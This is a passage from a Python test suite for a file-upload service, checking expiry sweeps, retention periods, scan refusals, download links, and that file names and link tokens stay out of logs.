    kept = upload(job_queue, "kept.pdf", s.pdf())
    old = upload(job_queue, "old.pdf", s.pdf())
    stuck, _ = send("stuck.pdf", s.pdf())                       # queued, and never scanned
    abandoned = begin("never-sent.pdf", 10)
    orphan = tmp_path / "store" / "u999" / str(uuid.uuid4())
    orphan.parent.mkdir(parents=True)
    orphan.write_bytes(b"left by a failed delete")
    left = tmp_path / "spool" / f"{uuid.uuid4()}.abc.part"
    left.write_bytes(b"an upload interrupted hours ago")
    os.utime(left, (time.time() - 2 * service.SPOOL_KEEP_S,) * 2)
    with db_engine.transaction() as conn:
        conn.execute(StoredFile.__table__.update().where(StoredFile.id == uuid.UUID(old["id"]))
                     .values(expires_at=now - timedelta(days=1)))
        conn.execute(StoredFile.__table__.update().where(StoredFile.id == uuid.UUID(stuck["id"]))
                     .values(uploaded_at=now - timedelta(seconds=rules.SCAN_STALE_S + 60), queued_at=now))
        conn.execute(StoredFile.__table__.update().where(StoredFile.id == uuid.UUID(abandoned["id"]))
                     .values(expires_at=now - timedelta(minutes=1)))
    # Past its time, a file is already gone for its owner, before the sweep runs
    assert client.get(f"/api/files/{old['id']}").status_code == 404
    assert client.post(f"/api/files/{old['id']}/link").status_code == 404
    summary = job_maintenance()
    assert {k: v for k, v in summary.items() if k.startswith("files_")} == {
        "files_store": "local", "files_scans_abandoned": 1, "files_expired": 2,
        "files_orphans_deleted": 1, "files_held": 1, "files_bytes": kept["size"],
        "files_budget_bytes": 800 * MB, "files_budget_used": round(kept["size"] / (800 * MB), 4)}
    assert all(isinstance(v, (int, float, bool, str)) or v is None for v in summary.values())
    assert stored(tmp_path) == [kept["id"]] and not left.exists()
    listed = {f["name"]: (f["status"], f["reason"]) for f in client.get("/api/files").json()["files"]}
    assert listed == {"kept.pdf": ("clean", None), "stuck.pdf": ("refused", "scan_failed")}
    # A scan that turns up late for the refused file changes nothing
    run_scans(job_queue)
    assert client.get(f"/api/files/{stuck['id']}").json()["status"] == "refused"
    assert job_maintenance()["files_expired"] == 0


def test_how_long_each_kind_of_row_is_kept(uploads, job_queue):
    def days_left(file):
        with db_engine.connect() as conn:
            row = conn.execute(select(StoredFile.created_at, StoredFile.expires_at)
                               .where(StoredFile.id == uuid.UUID(file["id"]))).one()
        return (row.expires_at - row.created_at).total_seconds() / 86_400
    assert days_left(begin("a.pdf", 10)) == pytest.approx(rules.PENDING_S / 86_400)
    assert days_left(upload(job_queue, "b.pdf", s.pdf())) == pytest.approx(rules.RETENTION_DAYS, abs=0.01)
    assert days_left(upload(job_queue, "c.pdf", s.pdf(s.JAVASCRIPT))) == pytest.approx(
        rules.REFUSED_KEEP_DAYS, abs=0.01)


def test_without_a_store_the_screen_is_told_and_nothing_is_accepted(uploads, monkeypatch):
    file = begin("a.pdf", 10)
    monkeypatch.delenv("FSE_UPLOADS_DIR")
    listed = client.get("/api/files").json()
    assert (listed["enabled"], listed["files"]) == (False, [])
    for answer in (client.post("/api/files", json={"name": "a.pdf", "size": 10}),
                   client.put(f"/api/files/{file['id']}/content", content=b"0123456789")):
        assert (answer.status_code, answer.json()["detail"]["code"]) == (503, "not_set_up")
    assert job_maintenance()["files_store"] == "none"


def test_an_unfinished_account_cannot_upload(uploads):
    app.dependency_overrides[require_user] = lambda: AuthUser(subject="test:no-profile")
    assert client.post("/api/files", json={"name": "a.pdf", "size": 10}).status_code == 409
    assert client.get("/api/files").json()["files"] == []


def test_the_local_download_link_exists_only_while_the_directory_store_is_in_use(uploads, job_queue, monkeypatch):
    file = upload(job_queue, "a.pdf", s.pdf())
    url = client.post(f"/api/files/{file['id']}/link").json()["url"]
    assert client.get(url).status_code == 200
    assert client.put(url, content=b"x").status_code == 405         # nothing is ever sent to a link
    monkeypatch.setenv("FSE_ENV", "production")
    assert client.get(url).status_code == 404


def test_nothing_from_a_file_or_a_link_reaches_the_log(uploads, job_queue, caplog):
    caplog.set_level(logging.DEBUG)
    name = "Project Falcon information memorandum.pdf"
    file = upload(job_queue, name, s.pdf(s.JAVASCRIPT))
    clean = upload(job_queue, name, s.pdf())
    url = client.post(f"/api/files/{clean['id']}/link").json()["url"]
    client.delete(f"/api/files/{clean['id']}")
    logged = "\n".join(f"{r.getMessage()} {getattr(r, 'fields', '')}" for r in caplog.records)
    assert "upload_scanned" in logged and file["reason"] in logged
    for secret in ("Falcon", "memorandum", url.rsplit("/", 1)[1], "app.alert"):
        assert secret not in logged


def test_rows_hold_nothing_but_the_name_and_where_the_file_stands(uploads, job_queue):
    upload(job_queue, "report.pdf", s.pdf())
    assert {c.name for c in StoredFile.__table__.columns} == {
        "id", "owner_id", "name", "kind", "size", "status", "reason", "created_at", "uploaded_at",
        "queued_at", "scanned_at", "expires_at"}
    assert rows.totals()["files"] == 1
